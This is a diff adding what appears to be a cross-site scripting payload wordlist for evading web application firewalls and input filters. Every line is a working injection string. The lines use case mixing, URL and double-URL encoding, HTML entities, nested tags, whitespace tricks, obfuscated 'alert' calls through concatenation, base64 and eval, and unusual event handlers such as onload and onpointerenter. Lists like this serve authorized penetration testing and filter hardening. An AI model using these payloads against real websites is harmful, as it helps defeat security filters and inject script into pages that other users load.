@@ -1,0 +1,28 @@
+# WAF/filter evasion — encoding, case, exotic tags.
+<sCrIpT>alert(1)</sCrIpT>
+<img src=x onerror="alert(1)">
+<img src=x onerror='alert(1)'>
+<img src=x onerror=alert`1`>
+<img src=x onerror=alert&lpar;1&rpar;>
+<img src=x oNerrOR=alert(1)>
+<img src=x oneRRor=alert(1) >
+<img src=x onerror =alert(1)>
+<img src=x onerror%09=alert(1)>
+<img src=x onerror%0a=alert(1)>
+%3Cscript%3Ealert(1)%3C/script%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<svg><script>alert(1)</script></svg>
+<svg><script>alert(1)</script>
+<IMG ""><SCRIPT>alert(1)</SCRIPT>">
+<img src=`x`onerror=alert(1)>
+<img src=x onerror=window['al'+'ert'](1)>
+<img src=x onerror=self['ale'+'rt'](1)>
+<img src=x onerror=top[8680439..toString(30)](1)>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<svg onload=eval(name)>
+<iframe/onload=alert(1)>
+<xml onreadystatechange=alert(1)>
+<svg onpointerenter=alert(1) style="position:fixed;inset:0">
